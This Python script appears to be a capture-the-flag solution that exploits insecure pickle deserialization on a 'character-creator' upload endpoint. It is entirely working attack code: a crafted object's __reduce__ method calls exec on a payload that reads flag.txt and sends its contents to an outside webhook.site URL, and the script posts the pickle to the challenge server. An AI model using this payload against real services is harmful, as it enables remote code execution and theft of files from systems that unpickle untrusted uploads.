import pickle
from io import BytesIO

import requests

WEBHOOK_URL = "https://webhook.site/71a7dc1c-28cd-4b5b-8c3a-db6d8d41f880"
CHALLENGE_URL = "https://character-creator.semanthon.com/load-character"


payload = f"from urllib.request import urlopen;urlopen('{WEBHOOK_URL}/'+open('flag.txt').readline())"


class Exploit:
    def __reduce__(self):
        return (exec, (payload,) )


buffer = BytesIO()
pickle.dump(Exploit(), buffer)
buffer.seek(0)
requests.post(CHALLENGE_URL, files={"file": buffer})
